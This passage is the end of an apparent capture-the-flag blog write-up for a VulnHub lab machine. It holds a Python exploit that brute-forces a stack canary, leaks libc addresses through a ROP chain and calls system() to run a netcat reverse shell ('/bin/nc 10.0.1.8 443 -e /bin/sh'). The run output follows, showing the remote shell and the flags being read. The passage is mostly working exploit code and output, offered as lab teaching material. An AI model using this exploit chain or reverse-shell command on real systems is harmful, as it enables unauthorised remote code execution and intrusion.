+                <span class="n">rec</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
+                <span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+                <span class="k">if</span> <span class="s">"---"</span> <span class="ow">in</span> <span class="n">rec</span><span class="p">:</span>
+                        <span class="n">canary</span> <span class="o">+=</span> <span class="n">hex_byte</span>
+                        <span class="k">print</span><span class="p">(</span><span class="s">"[*] Canary currently: "</span> <span class="o">+</span> <span class="n">canary</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s">"hex"</span><span class="p">))</span>
+                        <span class="k">break</span>
+<span class="k">print</span><span class="p">(</span><span class="s">"[+] Canary found: "</span> <span class="o">+</span> <span class="n">canary</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s">"hex"</span><span class="p">))</span>
+
+<span class="kn">from</span> <span class="nn">struct</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="p">()</span>
+<span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s">"127.0.0.1"</span><span class="p">,</span> <span class="mi">7979</span><span class="p">))</span>
+<span class="n">rec</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
+<span class="n">key</span> <span class="o">=</span> <span class="s">":"</span>
+<span class="n">pre</span><span class="p">,</span> <span class="n">key</span><span class="p">,</span> <span class="n">sockFD</span> <span class="o">=</span> <span class="n">rec</span><span class="o">.</span><span class="n">partition</span><span class="p">(</span><span class="s">':'</span><span class="p">)</span>
+<span class="n">key</span> <span class="o">=</span> <span class="s">"</span><span class="se">\n</span><span class="s">"</span>
+<span class="n">sockFD</span> <span class="o">=</span> <span class="n">sockFD</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="mi">1</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
+<span class="n">sockFD</span> <span class="o">=</span> <span class="n">sockFD</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s">" "</span><span class="p">,</span> <span class="s">""</span><span class="p">)</span>
+
+<span class="n">sockFD</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">sockFD</span><span class="p">)</span>
+
+<span class="n">memset_got</span> <span class="o">=</span> <span class="mh">0x6014e0</span>
+<span class="n">memset_libc_offset</span> <span class="o">=</span> <span class="mh">0x85620</span>
+<span class="n">system_libc_offset</span> <span class="o">=</span> <span class="mh">0x41490</span>
+
+<span class="n">write_plt</span> <span class="o">=</span> <span class="mh">0x400920</span>
+<span class="n">read_plt</span> <span class="o">=</span> <span class="mh">0x4009b0</span>
+
+<span class="n">poprdi</span> <span class="o">=</span> <span class="mh">0x00401013</span>
+<span class="n">poprsi</span> <span class="o">=</span> <span class="mh">0x00401011</span>
+
+
+<span class="c"># Stage 1: leak memset() libc address using write@pld</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="s">"A"</span> <span class="o">*</span> <span class="n">canaryCounter</span>		<span class="c"># trigger overflow</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">canary</span>			<span class="c"># insert correct cannary</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">"&lt;Q"</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">)</span>		<span class="c"># overwrite RBP</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">"&lt;Q"</span><span class="p">,</span> <span class="n">poprdi</span><span class="p">)</span>		<span class="c"># pop rdi</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">"&lt;Q"</span><span class="p">,</span> <span class="n">sockFD</span><span class="p">)</span>		<span class="c"># stdout to socket</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">"&lt;Q"</span><span class="p">,</span> <span class="n">poprsi</span><span class="p">)</span>		<span class="c"># pop rsi</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">"&lt;Q"</span><span class="p">,</span> <span class="n">memset_got</span><span class="p">)</span>	<span class="c"># address to read from</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">"&lt;Q"</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">)</span>		<span class="c"># junk for r15</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">"&lt;Q"</span><span class="p">,</span> <span class="n">write_plt</span><span class="p">)</span>	<span class="c"># return to write@plt</span>
+
+<span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+
+<span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.1</span><span class="p">)</span>
+<span class="n">rec</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
+<span class="k">print</span> <span class="n">rec</span>
+<span class="n">s</span><span class="o">.</span><span class="n">shutdown</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+<span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+<span class="n">split</span> <span class="o">=</span> <span class="n">rec</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
+
+<span class="n">memset_addr</span> <span class="o">=</span> <span class="n">unpack</span><span class="p">(</span><span class="s">"&lt;Q"</span><span class="p">,</span> <span class="n">split</span><span class="p">[</span><span class="mi">2</span><span class="p">][:</span><span class="mi">8</span><span class="p">])</span>
+<span class="k">print</span><span class="s">"[+] memset() is at: "</span><span class="p">,</span> <span class="nb">hex</span><span class="p">(</span><span class="n">memset_addr</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>
+
+<span class="n">libc_base</span> <span class="o">=</span> <span class="p">(</span><span class="n">memset_addr</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">-</span> <span class="n">memset_libc_offset</span><span class="p">)</span>
+<span class="k">print</span><span class="s">"[+] libc base is at: "</span><span class="p">,</span> <span class="nb">hex</span><span class="p">(</span><span class="n">libc_base</span><span class="p">)</span>
+
+<span class="n">system_addr</span> <span class="o">=</span> <span class="p">(</span><span class="n">libc_base</span> <span class="o">+</span> <span class="n">system_libc_offset</span><span class="p">)</span>
+<span class="k">print</span><span class="s">"[+] sysem() is at: "</span><span class="p">,</span> <span class="nb">hex</span><span class="p">(</span><span class="n">system_addr</span><span class="p">)</span>
+
+<span class="k">print</span><span class="s">"</span><span class="se">\n</span><span class="s">[+] Sending payload!!"</span>
+
+<span class="k">print</span> <span class="n">sockFD</span>
+<span class="n">sockFD</span> <span class="o">+=</span> <span class="mi">1</span>
+
+<span class="n">payload</span> <span class="o">=</span> <span class="s">""</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="s">"A"</span> <span class="o">*</span> <span class="n">canaryCounter</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">canary</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">"&lt;Q"</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">)</span>
+
+<span class="c"># Stage 2: Save string to writable location</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">"&lt;Q"</span><span class="p">,</span> <span class="n">poprdi</span><span class="p">)</span>		<span class="c"># pop rdi</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">"&lt;Q"</span><span class="p">,</span> <span class="n">sockFD</span><span class="p">)</span>		<span class="c"># socket to read from</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">"&lt;Q"</span><span class="p">,</span> <span class="n">poprsi</span><span class="p">)</span>		<span class="c"># pop rsi</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">"&lt;Q"</span><span class="p">,</span> <span class="mh">0x601010</span><span class="p">)</span>		<span class="c"># location to write to</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">"&lt;Q"</span><span class="p">,</span> <span class="n">sockFD</span><span class="p">)</span>		<span class="c"># junk for r15</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">"&lt;Q"</span><span class="p">,</span> <span class="n">read_plt</span><span class="p">)</span>		<span class="c"># return to read()</span>
+
+<span class="c"># Stage 3: call system() with location of string</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">"&lt;Q"</span><span class="p">,</span> <span class="n">poprdi</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">"&lt;Q"</span><span class="p">,</span> <span class="mh">0x601010</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">"&lt;Q"</span><span class="p">,</span> <span class="n">system_addr</span><span class="p">)</span>
+
+<span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="p">()</span>
+<span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s">"127.0.0.1"</span><span class="p">,</span> <span class="mi">7979</span><span class="p">))</span>
+<span class="k">print</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
+<span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.1</span><span class="p">)</span>
+<span class="c"># Stage 3: send command</span>
+<span class="k">print</span> <span class="s">"[+] Sending reverse_shell command"</span>
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">1000</span><span class="p">):</span>
+	<span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">'/bin/nc 10.0.1.8 443 -e /bin/sh</span><span class="se">\x00</span><span class="s">'</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>Now let’s run it and see what we get!</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bob@baffle:~<span class="nv">$ </span>python exploit.py
+<span class="o">[</span>+] Getting canary offset
+
+<span class="o">[</span>+] Server response User to query: Checking...
+Don<span class="s1">'t know anything about this user.
+
+[+] Canary offset: 1001
+[+] Bruteforcing Canary
+[*] Canary currently: 00
+[*] Canary currently: 0011
+[*] Canary currently: 00111a
+[*] Canary currently: 00111ae2
+[*] Canary currently: 00111ae23d
+[*] Canary currently: 00111ae23d56
+[*] Canary currently: 00111ae23d561c
+[*] Canary currently: 00111ae23d561c63
+[+] Canary found: 00111ae23d561c63
+User to query: Checking...
+Don'</span>t know anything about this user.
+ �ap��	@ �kp��[gp�P�[p�
+<span class="o">[</span>+] memset<span class="o">()</span> is at:  0x7fee7061f620
+<span class="o">[</span>+] libc base is at:  0x7fee7059a000
+<span class="o">[</span>+] sysem<span class="o">()</span> is at:  0x7fee705db490
+
+<span class="o">[</span>+] Sending payload!!
+2824
+Socket fd: 2825
+
+<span class="o">[</span>+] Sending reverse_shell <span class="nb">command</span>
+
+...SNIP...
+
+root@kali:/mnt/hgfs/kali64# nc <span class="nt">-lnvp</span> 443
+listening on <span class="o">[</span>any] 443 ...
+connect to <span class="o">[</span>10.0.1.8] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.0.1.9] 56791
+<span class="nb">id              
+</span><span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>vulnhub<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>vulnhub<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1000<span class="o">(</span>vulnhub<span class="o">)</span>,24<span class="o">(</span>cdrom<span class="o">)</span>,25<span class="o">(</span>floppy<span class="o">)</span>,27<span class="o">(</span><span class="nb">sudo</span><span class="o">)</span>,29<span class="o">(</span>audio<span class="o">)</span>,30<span class="o">(</span>dip<span class="o">)</span>,44<span class="o">(</span>video<span class="o">)</span>,46<span class="o">(</span>plugdev<span class="o">)</span>,108<span class="o">(</span>netdev<span class="o">)</span>
+<span class="nb">pwd</span>
+/home/vulnhub
+<span class="nb">ls</span> <span class="nt">-al</span>
+total 40
+drwx------ 3 vulnhub vulnhub 4096 Oct 25 16:49 <span class="nb">.</span>
+drwxr-xr-x 6 root    root    4096 Oct 20 03:38 ..
+<span class="nt">-rw-------</span> 1 vulnhub vulnhub    0 Oct 20 03:28 .bash_history
+<span class="nt">-rw-r--r--</span> 1 vulnhub vulnhub  220 Sep 12 15:05 .bash_logout
+<span class="nt">-rw-r--r--</span> 1 vulnhub vulnhub 3515 Sep 12 15:05 .bashrc
+<span class="nt">-rw-r--r--</span> 1 vulnhub vulnhub   45 Oct 25 16:49 flag.txt
+<span class="nt">-rw-r--r--</span> 1 vulnhub vulnhub  504 Jan  2 06:04 log.txt
+drwxr-xr-x 2 root    root    4096 Oct 25 16:46 .my_loot
+<span class="nt">-rw-r--r--</span> 1 vulnhub vulnhub  675 Sep 12 15:05 .profile
+<span class="nt">-rwx------</span> 1 vulnhub vulnhub  297 Oct 20 03:21 run_service.sh
+<span class="nt">-rw-r--r--</span> 1 vulnhub vulnhub   74 Oct 20 02:08 .selected_editor
+
+<span class="nb">cat </span>flag.txt
+Sorry Mario. The flag is <span class="k">in </span>another castle.
+
+<span class="nb">cd</span> .my_loot
+
+<span class="nb">ls</span> <span class="nt">-al</span>
+total 12
+drwxr-xr-x 2 root    root    4096 Oct 25 16:46 <span class="nb">.</span>
+drwx------ 3 vulnhub vulnhub 4096 Oct 25 16:49 ..
+<span class="nt">-rw-r--r--</span> 1 root    root     274 Oct 25 16:46 flag.txt
+
+<span class="nb">cat </span>flag.txt
+
+
+        <span class="o">!!!</span> CONGRATULATIONS <span class="o">!!!</span>
+
+                 .-<span class="s2">"-.
+                / 4 4 </span><span class="se">\</span><span class="s2">
+                </span><span class="se">\_</span><span class="s2"> v _/
+                //   </span><span class="se">\\</span><span class="s2">      
+               ((     ))
+         =======""===""=======
+                  |||
+                  '|'
+
+      FLAG{i_tot_i_saw_a_puddy_tat}
+</span></code></pre></div></div>
+
+<p>And lastly, the other flag is hidden in the git repo. Look below, I drew an arrow for you.</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">@@</span> <span class="o">-</span><span class="mi">32</span><span class="p">,</span><span class="mi">7</span> <span class="o">+</span><span class="mi">32</span><span class="p">,</span><span class="mi">7</span> <span class="err">@@</span> <span class="kt">int</span> <span class="n">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">argv</span><span class="p">[])</span> <span class="p">{</span>
+
+     <span class="n">memset</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buf</span><span class="p">));</span>
+     <span class="n">n</span> <span class="o">=</span> <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buf</span><span class="p">));</span>
+<span class="o">-</span>    <span class="n">parse_request</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="n">n</span><span class="p">);</span>
+<span class="o">+</span>    <span class="n">p</span><span class="p">{</span><span class="n">ARSE_REQUEST</span><span class="p">}(</span><span class="n">buf</span><span class="p">,</span> <span class="n">n</span><span class="p">);</span> <span class="o">&lt;---</span> <span class="n">This</span> <span class="n">is</span> <span class="n">the</span> <span class="n">flag</span><span class="o">!</span>
+
+     <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</code></pre></div></div>
+
+<h2 id="end">END</h2>
+
+
+</div>
+
+<div class="pagination">
+  
+    <a href="/2017-07-17/fought-the-OSCE" class="left arrow">&#8592;</a>
+  
+  
+    <a href="/2016-11-06/IMF" class="right arrow">&#8594;</a>
+  
+
+  <a href="#" class="top">Top</a>
+</div>
+
+    </main>
+
+    <footer>
+      <span>
+        &copy; <time datetime="2018-02-24 19:20:46 -0600">2018</time> . Made with Jekyll using the <a href="https://github.com/chesterhow/tale/">Tale</a> theme.
+      </span>
+    </footer>
+  </body>
+</html>
